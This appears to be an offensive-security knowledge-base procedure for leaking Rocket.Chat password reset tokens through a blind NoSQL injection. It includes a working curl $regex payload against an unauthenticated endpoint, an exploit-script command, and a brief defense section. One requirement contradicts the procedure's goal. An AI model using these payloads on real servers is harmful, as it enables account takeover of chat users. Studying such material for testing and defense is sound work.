---
id: proc-rocket-token-leak
tags:
  - nosql-injection
  - blind-injection
  - token-leak
type: procedure
tools:
  - '[[tools/Python3]]'
  - '[[tools/requests]]'
  - '[[tools/pre-auth-nosqli-py]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
commands:
  - '[[commands/run-pre-auth-nosqli-exploit]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
updated_at: '2025-12-14T03:46:19.929Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Credentials In Files]]'
---
# Leak-Password-Reset-Token-via-Blind-NoSQL-Injection

## Summary

This procedure exploits a blind NoSQL injection in Rocket.Chat's getPasswordPolicy method to leak the password reset token character-by-character using MongoDB $regex operators via the unauthenticated /api/v1/method.callAnon endpoint.

## Description

The 'token' parameter is directly injected into a MongoDB query without sanitization, allowing payloads like {"token":{"$regex":"^A"}} to test prefixes. Successful matches return the password policy JSON (true branch), while mismatches error out (false). Iterate over positions (e.g., 1-32 chars) and charset (alphanumeric + symbols) to reconstruct the full token. Requires prior password reset and Python for automation.

## Requirements

1. Running Rocket.Chat instance with vulnerable getPasswordPolicy
2. Leaked token from prior reset step
3. Python3 with requests library
4. Target URL and email

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all input parameters in API methods
- Use parameterized queries or MongoDB drivers with escaping
- Monitor for repeated /method.callAnon calls with regex patterns
- Enable WAF rules for NoSQL operator detection

## Objectives

1. Extract sensitive reset token from database
2. Enable unauthorized password reset
3. Bypass pre-auth controls

## Instructions

### Step 1: Run the Exploit Script for Token Leaking

**Context**: The custom script automates blind injection by sending DDP-formatted payloads and parsing responses for boolean outcomes.

**Command** ([[commands/run-pre-auth-nosqli-exploit]]):
```bash
python3 pre_auth_nosqli.py 'http://target:3000' 'target@example.com'
```

> The script outputs progress like "Guessing position 1: A (success)" and finally the full token. Errors indicate invalid guesses; adjust charset if needed.

### Step 2: Manual Payload Testing (Optional)

**Context**: For verification, send individual payloads via curl to test regex matches.

**Command** ([[commands/curl-nosql-payload-test]]):
```bash
curl -X POST 'http://target:3000/api/v1/method.callAnon' -H 'Content-Type: application/json' -d '{"msg":"getPasswordPolicy","params":[{"token":{"$regex":"^a"}}],"id":"1"}'
```

> Success: Returns policy JSON; Failure: 401/500 error.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Credential Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Credentials In Files]]

### Sub-Techniques


## Commands Used

- [[commands/run-pre-auth-nosqli-exploit]]
- [[commands/curl-nosql-payload-test]]

## Tools Used

- [[tools/Python3]]
- [[tools/requests]]
- [[tools/pre-auth-nosqli-py]]

## Tags

- nosql-injection
- blind-injection
- token-leak
